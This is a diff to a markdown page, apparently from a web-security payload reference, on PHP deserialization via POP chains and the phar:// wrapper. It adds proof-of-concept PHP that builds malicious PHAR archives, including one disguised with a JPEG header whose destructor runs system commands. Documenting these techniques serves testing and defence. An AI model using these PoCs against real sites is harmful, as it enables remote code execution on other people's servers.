@@ -119,7 +119,7 @@ a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
 
 ## Finding and using gadgets
 
-Also called "PHP POP Chains", they can be used to gain RCE on the system.
+Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
 
 [PHPGGC](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
 
@@ -141,42 +141,68 @@ Using `phar://` wrapper, one can trigger a deserialization on the specified file
 
 A valid PHAR includes four elements:
 
-1. Stub
-2. Manifest
-3. File Contents
-4. Signature
+1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
+2. **Manifest**: Contains metadata about the archive and its contents.
+3. **File Contents**: Contains the actual files in the archive.
+4. **Signature**(optional): For verifying archive integrity.
 
-Example of a Phar creation in order to exploit a custom `PDFGenerator`.
 
-```php
-<?php
-class PDFGenerator { }
+* Example of a Phar creation in order to exploit a custom `PDFGenerator`.
+    ```php
+    <?php
+    class PDFGenerator { }
 
-//Create a new instance of the Dummy class and modify its property
-$dummy = new PDFGenerator();
-$dummy->callback = "passthru";
-$dummy->fileName = "uname -a > pwned"; //our payload
+    //Create a new instance of the Dummy class and modify its property
+    $dummy = new PDFGenerator();
+    $dummy->callback = "passthru";
+    $dummy->fileName = "uname -a > pwned"; //our payload
 
-// Delete any existing PHAR archive with that name
-@unlink("poc.phar");
+    // Delete any existing PHAR archive with that name
+    @unlink("poc.phar");
 
-// Create a new archive
-$poc = new Phar("poc.phar");
+    // Create a new archive
+    $poc = new Phar("poc.phar");
 
-// Add all write operations to a buffer, without modifying the archive on disk
-$poc->startBuffering();
+    // Add all write operations to a buffer, without modifying the archive on disk
+    $poc->startBuffering();
 
-// Set the stub
-$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+    // Set the stub
+    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
 
-/* Add a new file in the archive with "text" as its content*/
-$poc["file"] = "text";
-// Add the dummy object to the metadata. This will be serialized
-$poc->setMetadata($dummy);
-// Stop buffering and write changes to disk
-$poc->stopBuffering();
-?>
-```
+    /* Add a new file in the archive with "text" as its content*/
+    $poc["file"] = "text";
+    // Add the dummy object to the metadata. This will be serialized
+    $poc->setMetadata($dummy);
+    // Stop buffering and write changes to disk
+    $poc->stopBuffering();
+    ?>
+    ```
+
+* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.
+    ```php
+    <?php
+    class AnyClass {
+        public $data = null;
+        public function __construct($data) {
+            $this->data = $data;
+        }
+        
+        function __destruct() {
+            system($this->data);
+        }
+    }
+
+    // create new Phar
+    $phar = new Phar('test.phar');
+    $phar->startBuffering();
+    $phar->addFromString('test.txt', 'text');
+    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+
+    // add object of any class as meta data
+    $object = new AnyClass('whoami');
+    $phar->setMetadata($object);
+    $phar->stopBuffering();
+    ```
 
 
 ## Real world examples
@@ -200,3 +226,4 @@ $poc->stopBuffering();
 * [Rusty Joomla RCE Unserialize overflow](https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41)
 * [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
 * [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
+* [phar:// deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
